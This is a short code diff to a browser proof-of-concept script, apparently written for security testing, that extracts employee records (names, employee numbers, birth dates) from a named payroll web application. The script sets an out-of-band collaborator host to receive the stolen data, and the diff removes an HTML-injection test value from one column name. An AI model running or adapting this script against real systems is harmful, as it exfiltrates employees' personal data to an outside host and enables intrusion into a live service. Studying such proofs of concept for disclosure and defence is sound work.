@@ -14,11 +14,11 @@
 (async function lohnabrechnungEmployeeExtractPoC() {
   'use strict';
 
-  const BASE = location.origin; // https://lohnabrechnung.sage.com
+  const BASE = 'https://lohnabrechnung.sage.com'; // 
   const OAST_HOST = '78dsx5tizgmyajfy8gpjw37cs3yumka9.oastify.com'; // set '' to skip exfil
   const GRID_COLUMNS = [
     'EmployeeNumber',
-    'FirstName<img>', // XSS demo column — use 'FirstName' if you only want email display
+    'FirstName', // XSS demo column — use 'FirstName' if you only want email display
     'LastName',
     'BirthDate',
     'Entry',
